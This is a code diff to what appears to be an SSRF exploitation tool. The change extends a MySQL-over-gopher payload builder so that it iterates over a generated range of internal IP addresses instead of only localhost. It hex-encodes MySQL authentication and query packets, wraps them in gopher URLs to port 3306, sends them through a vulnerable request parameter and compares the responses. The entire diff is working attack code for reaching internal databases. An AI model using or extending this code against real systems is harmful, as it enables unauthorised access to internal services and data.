@@ -50,27 +50,29 @@ class exploit():
         
 
         auth = dump.replace("\n","")
-        payload = self.get_payload(self.query, auth)
-        logging.info("Generated payload : {}".format(payload))
+        gen_host = gen_ip_list("127.0.0.1", args.level)
+        for ip in gen_host:
+            payload = self.get_payload(self.query, auth, ip)
+            logging.info("Generated payload : {}".format(payload))
 
-        r1 = requester.do_request(args.param, payload)
-        r2 = requester.do_request(args.param, "")
-        if r1 != None and r2!= None:
-            diff = diff_text(r1.text, r2.text)
-            print(diff)
+            r1 = requester.do_request(args.param, payload)
+            r2 = requester.do_request(args.param, "")
+            if r1 != None and r2!= None:
+                diff = diff_text(r1.text, r2.text)
+                print(diff)
 
 
-    def encode(self, s):
+    def encode(self, s, ip):
         a = [s[i:i + 2] for i in range(0, len(s), 2)]
-        return wrapper_gopher("%".join(a), "127.0.0.1", "3306")
+        return wrapper_gopher("%".join(a), ip, "3306")
 
 
-    def get_payload(self, query, auth):
+    def get_payload(self, query, auth, ip):
         if(query.strip()!=''):
         	query = binascii.hexlify( query.encode() )
         	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
         	pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
-        	final = self.encode(auth + pay1 + "0100000001")
+        	final = self.encode(auth + pay1 + "0100000001", ip)
         	return final
         else:
-    	    return self.encode(auth)
+    	    return self.encode(auth, ip)
